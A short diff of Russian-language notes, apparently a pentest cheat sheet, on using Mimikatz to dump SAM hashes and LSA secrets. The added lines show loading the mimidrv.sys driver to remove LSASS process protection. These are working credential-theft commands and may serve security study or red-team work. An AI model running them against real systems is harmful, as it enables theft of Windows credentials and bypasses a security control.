@@ -35,8 +35,11 @@ lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM
 
 - lsadump::secrets  - ntlm аккаунта машины
 
-    --- Если Защищенный LSASS
-      !+     -- загружаем mimidrv.sys   --- и тогда LSAS открыт
+    --- Если Защищенный LSASS!!!!!!!!!!
+  
+          !+     -- загружаем mimidrv.sys   --- и тогда LSAS открыт
+  
+          !processprotect /process:lsass.exe /remove
   
 Для получения данных из ntds.dit, аналогично команде lsadump::sam в инструменте Mimikatz, можно использовать следующие команды:
 
